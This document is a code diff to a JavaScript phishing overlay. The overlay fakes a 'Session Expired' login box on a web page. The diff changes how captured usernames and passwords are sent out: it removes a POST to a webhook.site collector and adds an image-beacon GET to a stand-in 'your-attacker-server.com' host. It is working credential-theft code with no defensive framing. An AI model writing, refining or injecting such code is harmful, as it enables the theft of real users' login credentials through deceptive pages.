@@ -23,7 +23,7 @@
   box.innerHTML = `
     <h3 style="margin-top:0;">Session Expired</h3>
     <p>Please log in again to continue.</p>
-    <input type="text" id="xuser" placeholder="Username" style="width:100%;padding:8px;margin:8px 0;">
+    <input type="text" id="xuser" placeholder="Username or Email" style="width:100%;padding:8px;margin:8px 0;">
     <input type="password" id="xpass" placeholder="Password" style="width:100%;padding:8px;margin:8px 0;">
     <button id="xsubmit" style="width:100%;padding:10px;background-color:#4CAF50;color:white;border:none;">Login</button>
   `;
@@ -33,17 +33,14 @@
 
   // Handle submission
   document.getElementById("xsubmit").onclick = function() {
-    const user = document.getElementById("xuser").value;
-    const pass = document.getElementById("xpass").value;
+    const user = encodeURIComponent(document.getElementById("xuser").value);
+    const pass = encodeURIComponent(document.getElementById("xpass").value);
 
-    // Send credentials to external server (change the URL to your listener)
-    fetch("https://webhook.site/fce0bc03-e81d-45a9-b0bb-de196889a371", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ user, pass })
-    });
+    // Send via GET request using an image beacon
+    const img = new Image();
+    img.src = `https://your-attacker-server.com/log?user=${user}&pass=${pass}`;
 
-    // Optional: remove the overlay
+    // Optional: remove the overlay after sending
     document.body.removeChild(overlay);
   };
 })();
